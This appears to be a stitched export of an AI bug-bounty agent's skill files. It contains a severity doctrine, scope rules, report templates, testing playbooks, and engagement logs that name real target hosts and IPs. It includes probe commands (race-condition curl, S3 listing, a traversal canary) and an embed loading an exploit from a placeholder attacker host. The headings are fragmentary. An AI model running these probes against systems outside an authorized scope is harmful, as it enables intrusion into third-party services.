# reporting-process — part 1/4 (95 segment(s))
# content-aware dedupe applied; every unique entry preserved.

## [Bugbountyskills.md] 0. SEVERITY DOCTRINE — HIGH/CRITICAL ONLY (Kr Hasan standing order, 2026-11-07)

Read this before any engagement. Full text, kept current, lives at
**`/root/hackbot-architecture/SEVERITY_DOCTRINE.md`** (same for the live hackbot loop:
`MASTER_WORKFLOW.md` §0 rule 7, `supervisor.sh`, `hunt-pipeline.sh`).

**REPORT ONLY:** RCE · command execution · code injection · SQLi (incl. NoSQLi) · XSS
(stored/reflected/DOM with real impact) · broken access control (BAC) · IDOR/BOLA ·
privilege escalation (horizontal + vertical) · authentication bypass · OAuth/OIDC/SSO
bypass · JWT/session forgery · LFI/RFI/path traversal · internal file read · SSRF
(incl. XSPA + cloud metadata) · XXE · insecure deserialization · sandbox/container escape ·
server-side misconfiguration with demonstrated impact · client-side misconfiguration with
demonstrated impact · business-logic error with monetary/account impact · sensitive
information disclosure WITH PoC · admin panel / internal service access · account takeover.

**NEVER REPORT STANDALONE — chain primitive only** (HackerOne Core Ineligible Findings,
https://docs.hackerone.com/en/articles/8494488-core-ineligible-findings): unsupported-browser
issues, broken-link hijacking, tabnabbing, content spoofing/text injection, physical-access
attacks, self-XSS/self-DoS; clickjacking or CSRF on non-sensitive actions, permissive CORS
without impact, version/banner disclosure, descriptive errors/headers/stack traces, CSV
injection, open redirect without added impact; SSL/TLS config, missing pinning, cookie flags,
CSP opinions, SPF/DKIM/DMARC, rate limiting; hazardous testing (DoS/traffic/social engineering).

**Operating rules**
1. Severity floor: below the REPORT-ONLY list = not a finding; a primitive is escalated or dropped.
2. Do NOT report early. Hold the primitive, keep digging (bypass → escalate → chain) until the
   chain reaches high/critical impact — an unproven chain is silence, not a draft.
3. No non-sensitive, no out-of-scope, no best-practice findings. P4/P5 is never a deliverable.
4. Efficiency: skip pointless recon/enumeration. Go at the SENSITIVE surface (auth/token, admin,
   account, payment, upload/download/export, internal & undocumented API, GraphQL, RPC, mobile BFF)
   and spend the budget BYPASSING and CHAINING it.
5. Every report needs demonstrated impact (CIA) + reproducible PoC + CVSS in the program's own
   P1/P2/P3 vocabulary. Unproven ⇒ REJECTED, never "P2 pending".
6. Think high-critical: "what is the worst outcome reachable here?" — auth bypass → admin → RCE;
   IDOR → ATO; SSRF → metadata → creds → RCE; upload/traversal → RCE; deserialization/SSTI/XXE →
   RCE; OAuth redirect_uri/postMessage → token theft → ATO; business logic → monetary loss at scale.
7. Drift audit before any draft: list the severities of your last five candidates — three or more
   at P4/P5/informational ⇒ you are drifting; change asset or class, do not lower the floor. A pass
   with only primitives ends "no reportable finding — N primitives held as leads", never with an
   informational report. Never report early, non-sensitive, or out-of-scope. Always aim high-critical.
8. RESEARCH FRESHNESS: fetch recent material (last 6–12 months). Never cite a writeup you have not
   opened — every technique carries its SOURCE url + date read. If a technique was not reproduced on
   a lab or first-hand PoC, tag it UNVERIFIED; if it cannot be reproduced at all, discard it and do
   not add it to the skill.
9. SEVERITY BEFORE THE RATING: state (a) the exact preconditions an attacker needs and (b) the exact
   data or action they gain, before calling anything High or Critical. No (a)+(b) ⇒ not High/Critical.
   "Think critical" = the worst realistic in-scope outcome and how to reach it, never a higher label
   than the evidence supports.

**Knowledge intake (keep upgrading this file):** read HackerOne Hacktivity, Bugcrowd published
reports, Intigriti, PentesterLand, Medium bug-bounty, InfoSec Writeups, HackerOne docs. Extract
CLASS / entry point / BYPASS / CHAIN / transferable test (not the CVE number) and append to
`/root/bugbountyhuntingskills.md` and this file's Section 17 in the existing SOURCE / CORE METHOD /
TRANSFERABLE TEST shape. Driver: `/root/hackbot-architecture/research-upgrade.sh` (also runs from
the hackbot loop's `stage_research`). Never re-derive a recorded bypass.

---

## [Bugbountyskills.md] 0. Scope gate — always first, no exceptions

Before sending a single packet:

1. Identify the target asset exactly (`$1` / the domain given).
2. Determine authorization: a published program covering that asset (HackerOne/Bugcrowd/
   self-hosted), a pentest engagement the user has in writing, the user's own infrastructure,
   or a lab/CTF. Search the program's policy if you don't know it.
3. Pull the **exact scope and exclusions**: in-scope hosts, out-of-scope paths, rate limits,
   testing windows, and anything marked "no testing" (DoS, email sending, payments, user
   data). Write these into the domain profile before testing.
4. If authorization is unclear, **stop and ask**. One question, then proceed. Do not soften
   this because the user said "full active testing" — active testing means *capability*,
   not *permission*. Permission comes from scope.

Refuse out-of-scope assets and third-party targets outright. Some things are never in scope
regardless of program language: destructive actions, service degradation, real payment
flows, reading or exfiltrating another real user's data beyond the minimum redacted proof,
and retaining credentials discovered during a test.

## [Bugbountyskills.md] 4. Knowledge intake — every report AND every conversation makes the system smarter

Two intake triggers feed the same loop: a lesson in `LESSONS.md` **plus** a write-back into
the matching technique skill. A lesson logged but not written back is not learned.

### [Bugbountyskills.md] 4a. Report intake (triage response, disclosed report, own finding)

When the user pastes a triage response, disclosed report, or their own finding:

1. **Extract the technique.** What class of bug, what the winning input was, what defense it
   defeated, and — most valuable — the *non-obvious detail* that made it work (the header
   nobody checks, the endpoint that skips validation, the encoding the WAF missed).
2. **Extract the miss.** If it's their own report that was closed/duplicated/informative,
   the lesson is in the rejection reason: false-positive pattern, missing impact proof,
   scope mistake. Those are the highest-value lessons of all.
3. **Write it back.** Add it as a new variant or a new **gotcha** line under *False positives*
  /*Detect* in the matching technique skill's `references/variants-*.md`. Existing structure
   wins — a 16th variant in `sqli-testing` belongs in `variants-2.md`, not a new file.
4. **Log it.** Append an entry to `LESSONS.md`: date, source, skill touched, what changed.
   This file is the proof the system compounds; never rewrite history in it.
5. **New category?** Only if the lesson belongs to none of the nine — then scaffold a new
   skill directory following `SKILL_SPEC.md`. Don't spawn a skill per bug; category skills
   get *deeper*, they don't multiply.

## [Bugbountyskills.md] 5. Report writing standard

A report survives triage when it is reproducible by someone who has never met you. Always:
minimal steps from a clean session, the exact request, expected vs. actual, one sentence of
*why it matters* tied to a real asset or action, and evidence with secrets/users redacted.
Severity follows impact on the program's own scale — a reflected parameter with no sink is
not Critical because the payload looked scary.

## [Bugbountyskills.md] 5. Report template

```markdown

<!-- exact-duplicate entries folded in: 9 -->

### [Bugbountyskills.md] Evidence (redacted)

<Request/response pair, IDs and PII masked, only ownership-proving fields visible.>

### [Bugbountyskills.md] Evidence (redacted)

<Request/response pairs + the state readback; cookies, tokens, and other users' data masked.>

## [Bugbountyskills.md] Sequential control for the report (must show exactly 1)

for i in 1 2; do curl -sS -b jar_a.txt -X POST '<TARGET_URL>/api/coupon/apply' \
  -d 'code=<YOUR_TEST_CODE>'; sleep 1; done
```

**Confirm:** Two or more *distinct* persisted orders (or redemptions) each carry the
discount of a 1-use code, reproduced in ≥2 rounds, while the sequential control stays at
exactly one — and each order is re-fetched individually so idempotent replays are ruled
out. You verified only your own carts and your own code.

**False positives:** Two 200s resolving to the *same* order id (idempotency key working —
one spend, not two); discount applied then reversed by an async validator (wait for the
queue to drain, re-read); jitter with sequential processing (see race-vs-jitter in
`payloads.md` — the counter never exceeds 1); cached order lists (cache-buster); a code
whose limit you misread (re-check: per-user vs global vs per-cart); UI showing discount
pre-commit while the ledger shows none.

**Impact:** "A code restricted to `<1>` use yielded `<N>` redemptions for a single
account via concurrent `<apply>` requests." Use the demonstrated multiplier (2×, 3×);
"unlimited" requires a bounded proof you likely should not run.

**Remediation:** Make redemption a single atomic conditional update
(`UPDATE coupons SET uses = uses + 1 WHERE code = ? AND uses < limit`) or a unique
constraint on `(code, user)` with serialization held through checkout commit, so
losing requests fail cleanly.

**CWE / OWASP:** CWE-362 / CWE-367 (TOCTOU); OWASP A04:2021 Insecure Design
(A07:2021 where the abused limit is an authentication/abuse-prevention control).

---

## [Bugbountyskills.md] legacy client leg, only if in scope: <embed src="https://<ATTACKER_HOST>/exploit.swf">

```
Evidence = raw permissive policy with offending lines highlighted + the paired active CSRF PoC (`references/payloads.md`).

**Confirm:** the permissive policy is served *by the target origin* (no redirect/CDN mixup) **and** a demonstrable cross-origin capability tied to it — a legacy-client repro in scope, or an active CSRF/read on the same origin the policy is evidence for. Policy-file-only observations stay informational.

**False positives:** a strict policy (`domain="www.example.com"` exact) — that is correct pinning, not a finding; policy on an asset subdomain setting no cookies and hosting no auth routes (hygiene note only); claiming exploitability on a modern-only target — Flash is dead, never report "Flash CSRF" as the live mechanism there; double-counting `crossdomain.xml` and `clientaccesspolicy.xml` as two findings (fold them).

**Impact:** legacy full SOP waiver (cross-origin read + credentialed custom-verb writes, no preflight) for policy-consuming clients; on modern targets file it as informational misconfiguration that supports the severity of an adjacent active CSRF or CORS finding.

**Remediation:** delete the policy files unless a documented legacy client requires one; if required, pin exact domains, no wildcards, no wildcard header grants, never `domain="*"`.

**CWE / OWASP:** CWE-346, CWE-942, CWE-352; OWASP A01 (legacy A8:2017).

---

## [Bugbountyskills.md] >> info-disclosure-testing — SKILL.md

*Source: `/root/Myskill/info-disclosure-testing/SKILL.md`*

## [Bugbountyskills.md] info-disclosure-testing: Leaks & Disclosure Deep Playbook

## [Bugbountyskills.md] Evidence

<Redacted request/response pairs. Secrets shown as pattern + last 4 chars or hash:
e.g. AWS key `AKIA••••••••7Q`, DB URL `postgres://app@<host>/•••`. Never the live value.>

## [Bugbountyskills.md] from in-scope HTML/JS/pages you already fetched — no external scanning needed

grep -ohE '(https?://)?[a-z0-9.-]+\.s3[.-][a-z0-9.-]*amazonaws\.com[^"'\'' )]*' <fetched-files>
grep -ohE 'https?://[a-z0-9.-]+\.s3-website[.-][a-z0-9.-]*\.amazonaws\.com'      <fetched-files>
grep -ohE 'https?://storage\.googleapis\.com/[a-z0-9._-]+'                        <fetched-files>
grep -ohE 'https?://[a-z0-9.-]+\.blob\.core\.windows\.net/[a-z0-9._-]*'           <fetched-files>
grep -ohE '(gs|s3)://[a-z0-9._/-]+'                                               <fetched-files>
```
Confirm each name's tie to the target (it appears in *their* page/JS — a bucket
mentioned in a tutorial may belong to someone else; check program scope).

**Step 2 — AWS: anonymous list attempt (GET only).**
```bash
curl -sS -i "https://<BUCKET>.s3.amazonaws.com/?list-type=2&max-keys=5"

## [Bugbountyskills.md] >> info-disclosure-testing — variants-1.md (variant playbook)

*Source: `/root/Myskill/info-disclosure-testing/references/variants-1.md`*

## [Bugbountyskills.md] info-disclosure-testing — Variants 1-8 (references/variants-1.md)

Deep playbook for the first half of the leak matrix. Read §4 of `SKILL.md` for the
verification standard before claiming any of these as findings — in this category the
gap between "found something" and "reportable finding" is a sensitivity judgment, not
a technical one. Path wordlists, curl templates, and the `.git` validation procedure
live in `payloads.md`. Redact every secret you cite; never modify what you enumerate.

## [Bugbountyskills.md] V-03: Detailed debugging exception extraction via stack trace disclosures

**Mechanism:** An unhandled exception reaches the client as a full trace: file paths,
class/method chains, framework versions, SQL fragments, sometimes env values. Violated
assumption: "the user sees a generic message" — debug mode is on, or the API returns
raw 500 bodies (GraphQL/JSON APIs are notorious). The trace is a recon multiplier: it
names modules, absolute paths (feeds `path-traversal-testing`), and DB tables.

**Preconditions:**
- An exception path exists (invalid types, bad IDs, missing headers are usually enough).
- Debug/verbose error handling is on, or the framework's default JSON error includes `trace`/`stack`.

**Detect:**
1. Trigger errors with benign malformed input: invalid JSON, `?id=abc` on a numeric
   endpoint, wrong `Content-Type`, unsupported method. Capture full *bodies* — traces
   live in the 400/500 body, not the headers.
2. Fingerprint the dump: Django DEBUG (`Traceback (most recent call last)`), Werkzeug
   (`File "/app/…", line`), Spring whitelabel, ASP.NET (`Server Error in '/'`),
   PHP (`Fatal error: Uncaught … in /var/www/…`), Express stack arrays, Rails, Whoops/Ignition.
3. Extract deliberately: messages embed values — SQL errors leak queries (→ `sqli-testing`),
   `FileNotFoundError` leaks intended paths, parse errors echo expected schema.
4. Check non-error debug routes: `/_profiler`, `/actuator/trace`, `/debug`, `/__debug__/`.

**Proof of concept:**
```http
POST /<api-path> HTTP/1.1
Host: <TARGET.HOST>
Content-Type: application/json

{"<known-param>": <malformed-type-for-it>}
```
Observed (redacted): HTTP 500 with `at <service>.handlers.<fn>(/opt/<app>/src/…:NN)`,
framework version `"<framework> <version>"`, internal path `/opt/<app>/…`.

**Confirm:** A *different* malformed input produces a trace from the same code path
(same file:line) — proving it's the app's real error, not a canned page; or the claimed
version matches an independent fingerprint (V-02).

**False positives:** Generic 500 HTML with no trace (WAF/LB errors); error pages that
merely *quote the URL* (reflection, not a trace); client-side framework overlays in JS
(V-09 territory); traces made only of your own input echoed back — require server-side
artifacts (paths, versions, class names). Debug ports out of scope.

**Impact:** Version-accurate targeting plus internals: file paths, module names, table
names, sometimes DSN credentials. Report as "unauthenticated error triggering returns
full stack traces exposing <structure> and <version>". Medium standalone; higher if the
trace includes a secret.

**Remediation:** Turn debug detail off in production (`DEBUG=False`,
`server.error.include-stacktrace=never`, `customErrors="On"`); return a correlation ID
to the client and log the full trace server-side only.

**CWE / OWASP:** CWE-209 (Information Exposure Through an Error Message), CWE-497 —
OWASP A05:2021; WSTG-ERR-01.

---

## [Bugbountyskills.md] >> info-disclosure-testing — variants-2.md (variant playbook)

*Source: `/root/Myskill/info-disclosure-testing/references/variants-2.md`*

## [Bugbountyskills.md] info-disclosure-testing — Variants 9-15 (references/variants-2.md)

Deep playbook for the second half of the leak matrix — frontend artifacts, cloud
storage, config/API/log files, and metadata. Read §4 of `SKILL.md` for the
verification standard first: in every one of these variants the finding lives or dies
on *sensitivity triage* (public bucket ≠ bug; public bucket with PII = report). Path
wordlists, curl templates, bucket verification, and the redaction checklist live in
`payloads.md`.

## [Bugbountyskills.md] GPS Latitude  : <coordinates present — reported as rounded/omitted>

## [Bugbountyskills.md] --- curl: canary read, evidence = first bytes only ---

curl -s 'https://<TARGET>/download?file=<PLACEHOLDER_CANARY_PATH>' | head -c 200

## [Bugbountyskills.md] then:   <advisory> affected range + fix version       → cite in report

```

## [Bugbountyskills.md] evidence = counts + column names; data rows stay redacted

```

**Confirm:** Two channels: the `1=1`/`1=2` count differential (injection) or
unpermissioned read (authz gap) *plus* a control showing the same data is
private by comparison (file read of app-private path fails from the same
context). Reproduce twice.

**False positives:** `exported="false"` provider readable only by the same
UID — not a finding. SecurityException on access = permission *enforced*
(record as protected). `FileProvider` with `readPermission` +
`grantUriPermissions` correctly scoped is the secure pattern — don't report
it for existing. adb's shell user has broader power than a normal app —
confirm from an unprivileged third-party app before claiming "any app".
Leaked provider *authority names* are metadata, not data leakage.

**Impact:** "Unprotected exported provider `<AUTHORITY>` exposes
`<DATA CLASS>` (PII/tokens/messages) to any installed app; selection
injection allows row-set control." Evidence: schema + counts, rows redacted.

**Remediation:** `android:exported="false"` unless integration requires
otherwise; enforce `signature`-level permissions (or explicit
`readPermission`/`writePermission`), parameterize selection queries, and
tighten FileProvider path grants.

**CWE / OWASP:** CWE-926 (Improper Export of Android Application
Components), CWE-89 (SQL Injection where selection is injectable), CWE-200;
OWASP MASVS / MASTG — platform interaction & data storage testing.

## [Bugbountyskills.md] Evidence

<Redacted request/response pairs; hashes or truncated payloads if the program
restricts payload sharing. Show the boolean flip and the confirmation signal.>

## [Bugbountyskills.md] Evidence (redacted)

```http
<request/response pair with real host redacted, payload kept verbatim>
```
<Console screenshot or DOM snippet showing the inert execution marker>

## [Bugbountyskills.md] 1) Program-mandated custom headers (e.g. X-Inspectiv-Tester) must be scoped to

## [Bugbountyskills.md] in-scope hosts via ctx.route — sending them on cross-origin subrequests

### [Bugbountyskills.md] Evidence (redacted)

<request/response pair; both signals; versions exact as observed.>

## [Bugbountyskills.md] >> bug-bounty-methodology — Continuous methodology extraction from reports

*Source: `/root/.hermes/skills/bug-bounty-methodology/SKILL.md`*

### [Bugbountyskills.md] Step 1: Fetch Reports (When No Task Available)

When no bug hunting task is assigned, automatically fetch reports from:
1. Medium: www.medium.com/tag/bug-bounty
2. Hacktivity: hacktivity.com/summary-2025/
3. Bugcrowd: www.bugcrowd.com/research
4. PentesterLand: www.pentester.land/
5. InfosecWriteups: www.infosecwriteups.com/
6. Google Dorking: site:medium.com bug bounty writeup

### [Bugbountyskills.md] W-H. Reporting & triage methods

- **Triage thesis [W-6, preview only — full text paywalled]:** escalation is
  communicated, not granted — "how well you communicate rather than how severe the
  vulnerability is" separates dismissed from escalated; calibrate for triagers reading
  dozens of reports/day. Treat clarity as a scoring input, not a style preference.
- **The 9-section client report skeleton [W-15]:** Executive Summary → Scope of
  Engagement (targets, black-box type, tools, methodology refs) → Risk Rating Methodology
  (Critical/High/Medium/Low defined) → Findings Summary table (ID | Vuln | Severity |
  Impact) → Detailed Findings (severity + CVSS, description, evidence, proof of access,
  impact bullets, recommendations) → Attack Chain Demonstration (numbered narrative) →
  Overall Risk Assessment (single headline risk level) → Remediation Priority (0-7d /
  7-30d / long-term) → Conclusion.
- **Three questions per finding [W-3]:** what was done, what could realistically happen
  if abused, what needs to change. Root-cause walkthrough + concrete remediation (not
  "validate input") [W-1]; pair findings with OWASP/CheatSheet references [W-7];
  calibrate impact wording to "Vulnerable Dependency" vs "Outdated version" tiers
  [W-11].
- **Severity calibration examples [W-5][W-12]:** auth PR:N vs PR:L shifts CVSS
  materially (public registration ⇒ XSS ~9.3); k8s scoring: token exposure and
  over-permissive RBAC = Critical, command injection/privileged pods = High, SQLi =
  Medium. Score from demonstrated capability, not payload drama.

## [Bugbountyskills.md] >> hacktivity-report — Daily report reading & methodology intake

*Source: `/root/.hermes/skills/hacktivity-report/SKILL.md`*

## [Bugbountyskills.md] Hacktivity Report Workflow

### [Bugbountyskills.md] Step 1: Fetch Latest Reports

```bash

## [Bugbountyskills.md] Search for disclosed reports by vulnerability class

web_search("HackerOne disclosed report <vuln-class> methodology", limit=5)
web_search("bug bounty write-up <vuln-class> methodology", limit=5)
```

## [Bugbountyskills.md] Report Format (SUBZY-STYLE)

All scan results must be formatted as follows:

```

<!-- exact-duplicate entries folded in: 1 -->

## [Bugbountyskills.md] Control & Validation Pattern (REQUIRED before reporting)

Run every vulnerability test twice: once with the malicious payload, once with a benign control. The control must return the same expected error for the WAF check to be valid.

### [Bugbountyskills.md] Phase 1: Scope and constraints

- Read the complete program policy.
- Identify in-scope assets, exclusions, prohibited techniques, rate limits, and disclosure requirements.
- Record the approved testing accounts and environment.
- Do not interact with a target until its authorization and scope are established.

### [Bugbountyskills.md] Phase 5: Reporting

Produce professional reports with:

Title

Summary

Affected Asset and Endpoint

Security Impact

Preconditions

Steps to Reproduce

Expected Result

Actual Result

Evidence

Severity Rationale

Recommended Remediation

Use clear, reproducible steps and minimal proof of concept. Explain realistic impact without exaggeration. Do not fabricate evidence, affected users, bounty expectations, or severity.

## [Bugbountyskills.md] 📋 RAW SCOPE HANDLING (ORGANIZE FIRST, THEN HUNT)

When the user pastes **RAW scope** — unstructured program-page text, copy-paste from HackerOne / Intigriti / YesWeHack / Bugcrowd / Immunefi, half-formatted notes, anything — **do NOT start testing yet**. First organize it, then hunt.

1. **CLEAN & ORGANIZE** — parse the raw text into a structured scope map:
   - **In-scope assets** — domains, wildcards (`*.target.com`), URLs, IPs, CIDRs, mobile apps, API hosts
   - **Out-of-scope exclusions** — exact hosts, third-party services, acquisitions, excluded paths
   - **Excluded bug classes** — "we do not pay for X" list
   - **Safe harbor / rules of engagement** — test accounts, credentials provided, rate limits, reporting rules
   - **Program notes** — bounty table, priority targets, disclosure policy, contact/triage channel

2. **BUILD THE SCOPE TABLE** — before any request, output a clean organized summary:

   | ## | Asset | Type (domain/sub/IP/API/app) | In scope? | Notes |
   |----|-------|------------------------------|-----------|-------|
   | 1  | `*.target.com` | wildcard domain | ✅ | main app + API |
   | 2  | `api.target.com` | subdomain | ✅ | REST v2 |
   | 3  | `admin.target.com` | subdomain | ❌ OUT | third-party — do not touch |
   | 4  | `staging.target.com` | subdomain | ⚠️ verify | check again before testing |

3. **VERIFY EVERY REQUEST** — every asset you test is cross-checked against this organized scope. One out-of-scope request = potential ban. When in doubt, re-read the scope table.

4. **HUNT FROM THE ORGANIZED SCOPE** — after the table is confirmed: load the matching skill (`bb-methodology` → `web2-recon` → `bug-bounty`) and run the normal pipeline (recon → surface → hunt → validate → report). Start with 🔴 P0 / 🟠 P1 assets.

5. **AMBIGUOUS SCOPE** — if the raw text is unclear or contradictory, ask ONE short clarifying question. Never guess an asset is in scope.

6. **LOG IT** — save the organized scope to the hunt memory / lead board (`lead_board.py ingest`) so it survives across sessions.

> Rule: **NO testing until scope is organized and confirmed.** Organize → confirm → then hunt.

## [Bugbountyskills.md] CVSS Quick Reference

| Score      | Severity    | Typical Payout     |
| ---------- | ----------- | ------------------ |
| 9.0 - 10.0 | 🔴 Critical | $5K - $100K+       |
| 7.0 - 8.9  | 🟠 High     | $2K - $20K         |
| 4.0 - 6.9  | 🟡 Medium   | $500 - $5K         |
| 0.1 - 3.9  | 🟢 Low      | $100 - $1K         |

## [Bugbountyskills.md] >> LESSONS.md — Report- and conversation-derived learning log (append-only)

*Source: `/root/Myskill/LESSONS.md`*

## [Bugbountyskills.md] LESSONS — report- and conversation-derived learning log

Every report the user shares **and every substantive conversation about a technique** gets
mined here, then written back into the technique skills. Append-only: never rewrite or
delete past entries. New entries go at the bottom.

**Format:**

```

## [Bugbountyskills.md] YYYY-MM-DD — <source: own-report / triage-response / disclosed / third-party / conversation>

- Lesson: <the non-obvious detail — what actually made it work or fail>
- Class: <bug class> → skill: <skill-directory>
- Change: <new variant / gotcha under False positives / Detect / workflow change> @ <file>
- Repeat signal: <why this matters — is it a pattern?>
```

**Mining rules** (see `bug-hunter` skill, section 4 — 4a reports, 4b conversations):

1. The *non-obvious* detail is the lesson. "SQLi is bad" teaches nothing; "the WAF only
   parsed `Content-Type` once, so a second `charset` beat it" teaches everything.
2. A rejection/closure is a lesson too — false-positive patterns and missing impact proof
   are the highest-value entries in this file.
3. Write the change into the matching technique skill in the same pass; a lesson logged but
   not written back is not learned.
4. New skill directories only when a lesson belongs to none of the nine categories —
   scaffolds must follow `SKILL_SPEC.md`.
5. Conversations count. At the close of any substantive exchange about a technique, map the
   topic to its category skill (DOM XSS → `xss-testing` V-03, etc.), pull the core — the
   gotcha, the FP pattern, the tooling trick — and write it into that skill's variant file
   in the same pass as this entry. No non-obvious detail? Write nothing.

---

## [Bugbountyskills.md] 2026-10-21 — intake rule widened: conversations now mined like reports

- Source: own-maintenance, user directive ("i want my every single conversation setup as skill —
  if i talk about DOM XSS, add the core of the conversation onto the DOM XSS category").
- Lesson: the write-back loop was previously gated on *pasted reports* (bug-hunter §4), so
  technique talk that never became a report left no trace — the PhantomBuster DOM-XSS session
  only survived because it happened to produce findings. The rule now triggers on any substantive
  technique exchange: map topic → category skill (§3 routing table) → pull the non-obvious core →
  fold into that skill's `references/variants-*.md` under the right variant → log here with source
  `conversation`. Noise guard kept: exchanges with no non-obvious detail produce no entry, so the
  log doesn't drown.
- Class: suite maintenance → skill: `bug-hunter` (§4 split into 4a reports / 4b conversations),
  `LESSONS.md` (header, format, mining rule 5)
- Change: `bug-hunter/SKILL.md` §4 + frontmatter description trigger; this entry.
- Repeat signal: second user-directed restructure — same procedure as the rce/ssrf split: apply
  directive, fix cross-refs in the same pass, log here.

## [Bugbountyskills.md] 2026-10-21 — unauthenticated info-disclosure sweep (PhantomBuster staging, continuation)

- Source: own-engagement (v2staging.phantombuster.io + api-staging.phantombuster.io), user directive
  ("go for unauthenticated information disclosure testing if you get any server side information
  or sensitive or potential let me know"), skill: info-disclosure-testing.
- Findings reported to user:
  (a) POTENTIAL — hardcoded Customer.io credentials (site id + API key + testing key) in every
      public JS bundle (PB2_CUSTOMER_IO_*); impact = possible read of customer PII profiles /
      message triggering via Customer.io API. NOT actively validated (key belongs to a third-party
      vendor host = out-of-scope per SKILL §1) → reported for vendor-side validation + rotation.
  (b) api-staging credential oracle: "Missing session cookie or API key" vs "API key not found"
      split confirms per-key validation; error message also discloses keys accepted in QUERY
      STRING (?key=) → leak-prone auth design. Chain with earlier CORS reflect-any-Origin +
      credentials finding.
  (c) LOW — Lambda@Edge gate 401 body leaks Node runtime "22.23.2"; robots.txt maps every private
      route (admin/, dev/, workspace-settings...); security.txt discloses the reporting channel
      (Yogosha program "the-phantom-company" with tokenized URL); bundle config enumerates extra
      staging surface (api-staging.tealde.io + *.tealde.io v3, staging Zendesk/Quaderno/Stytch
      tenants, dev Disqus shortname, Sentry DSN+release hash, local.gist.build dev endpoints).
- Clean/negative: .git/.env/backups unreachable (gate exact-path allowlist; all encoding bypasses
  still 401); .well-known/* sits past gate but only security.txt exists; source maps referenced via
  sourceMappingURL but never served (404 soft-404, 3/3 spot-checks); no AKIA/ghp_/AIza/JWT/private-key
  patterns anywhere; no stack traces/internal IPs from any malformed-input probe (uniform JSON,
  400/401/403/405 only, TRACE disabled); S3 listing denied on both config-disclosed buckets
  (403 AccessDenied XML — single read-only root GET each, stopped there); static host config files
  (spa_config_staging/prod.json) fetchable but benign (banner text + incident script IDs).
- Method lessons (folded into skill): read 4xx BODIES not just statuses (version leak); calibrate
  existence oracle with known-existing vs known-missing before trusting it (extension hypothesis was
  wrong — allowlist is exact-path); md5 error bodies to detect catch-all auth (no oracle);
  generic secret regex ≠ enough — add app-config-block grep ([A-Z0-9_]*API_KEY: pattern); compare
  credential-error MESSAGES for missing/invalid splits (= key-validation oracle + auth-mechanism
  disclosure). Details in info-disclosure-testing/references/variants-1.md (V-02 + V-06 field notes).
- Scope: user has still not confirmed program scope for v2staging (security.txt suggests Yogosha
  "the-phantombuster-company" is the disclosure channel); tealde.io hosts reported but NOT probed
  (different registrable domain).
- Class: technique → skill: info-disclosure-testing (V-02, V-06 field notes); bug-hunter (engagement log)

## [Bugbountyskills.md] Scope

- In scope: <hosts, paths>
- Out of scope / exclusions: <paths, actions, DoS, payments, user data>
- Rate limits & testing windows: <numbers/windows, or "unspecified — be conservative">

## [Bugbountyskills.md] Scope

- In scope: **UNKNOWN — not confirmed.**
- Out of scope / exclusions: **UNKNOWN.** Assume DoS is excluded (standard for VDPs);
  the php2shell `CVE-2026-109618` template is intrusive/crash-capable, so it is
  presumptively out of scope until the policy says otherwise.
- Rate limits & testing windows: unspecified — be conservative.
- **Authorization basis asserted by operator:** none for this domain. The operator's
  2026-10-23 "rights over the whole infrastructure" claim was made in the context of
  `carter-cash.com`, a different asset. Do **not** carry that claim over to aida.de.

## [Bugbountyskills.md] Scope

- In scope: `https://bb.bigid.cloud/` — all unauthenticated attack surface (RXSS, DOM XSS, stored XSS, GET-based XSS, CSRF, SQLi, info disclosure, path traversal, business logic, header/response injection).
- Out of scope / exclusions: authenticated abuse beyond unauth surface, destructive actions, DoS/rate-limit exhaustion, credential reuse.
- Rate limits & testing windows: unspecified — be conservative (small bursts, back off on 403/406/429).

## [Bugbountyskills.md] Scope

- **Original target given: `shop-staging.casinop-baden-baden.de` → NXDOMAIN (does not exist).**
  The apex `casinop-baden-baden.de` is also NXDOMAIN — the operator's hostname had an extra `p`.
- **Corrected target (operator-confirmed): `https://shop-staging.casino-baden-baden.de`**
  → `178.16.58.223`. Sibling `shop.casino-baden-baden.de` resolves to the **same IP**
  (likely same box, different vhost). `staging.casino-baden-baden.de` has no A record.
- Related live hosts found passively (NOT confirmed in scope, **do not test**):
  `casino-baden-baden.de` / `www.` → 92.205.22.180, `casinobadenbaden.de` → 88.198.116.121,
  `casino-baden-baden.com` → Cloudflare.

### [Bugbountyskills.md] Program exclusions that shape this engagement (from the pasted policy)

- **Denial of Service (DoS) → NON-QUALIFYING.** ⇒ `CVE-2026-109618.yaml`
  ("Active Crash Detection", 1/8/20 MiB OOM payloads) is **out of scope — never run it here.**
- **"Recently disclosed CVEs (less than 30 days since patch release)" → NON-QUALIFYING.**
  php2shell is dated **2026-10-21** (`php.net/archive/2026.php`, ref `2026-10-21-5`).
  From 2026-10-24 that is **3 days old → php2shell reports are non-qualifying until ~2026-11-20.**
- **"CVEs without exploitable vulnerabilities and PoC" → NON-QUALIFYING.**
- **"Disclosure of information without exploitable vuln and PoC (…software versions, IP
  disclosure, directory listings…)" → NON-QUALIFYING.** ⇒ pure version/tech fingerprint = intel only.
- **"Lack or bypass of rate-limiting, brute-forcing or captcha issues" → NON-QUALIFYING.**
  ⇒ **Do not brute-force the HTTP Basic Auth** — it would be wasted and against the rules.
- **"User enumeration" → NON-QUALIFYING.**
- Also excluded: malicious file upload (EICAR/.EXE), SQLi-as-CVE-without-PoC, low-severity CSRF,
  GraphQL introspection alone, subdomain takeover without full PoC.
- **Qualifying (what to aim at):** SQLi, XSS, RCE, IDOR, priv-esc, auth bypass, business logic,
  LFI/RFI/XXE/SSRF/XSPA, CORS with real impact, CSRF with real impact, open redirect, exposed
  secrets affecting an in-scope asset.

## [Bugbountyskills.md] frontier.com — bgp/ipadmin scope

**Program / authorization:** Inspectiv managed bug bounty (private program — no public
policy page; scope confirmed directly by operator 2026-10-24). Origin of engagement: a
researcher report against `/bgp_procedures_new_form.php` (reflected XSS claim, Inspectiv
PoC headers present in the pasted report).
**Last engagement:** 2026-10-24

## [Bugbountyskills.md] Scope

- In scope (operator-confirmed 2026-10-24): **bgp.frontier.com** (all paths), **ipadmin.frontier.com**
  (all paths), HTTP + HTTPS. Unauthenticated testing is enough (no test account in play).
- Out of scope: every other `*.frontier.com` host. crt.sh shows 376 names (sso, api-prod,
  partnerportal2-qat, solr, fybrlabs, speedtest, webmail, payment-*, …) — **do not touch
  without new scope confirmation**. Archived in `references/ct-names.txt`.
- Exclusions: DoS/rate abuse, authenticated actions without an operator-supplied session,
  retaining any discovered credentials.
- Rate limits: unspecified — be conservative. Fuzzing used ≤15 req/s, ≤6 threads.

## [Bugbountyskills.md] Evidence — exposed config surface (finding 002) + parity — 2026-10-24

## [Bugbountyskills.md] Evidence (redacted)

```http
GET /.gitignore HTTP/1.1
Host: bgp.frontier.com

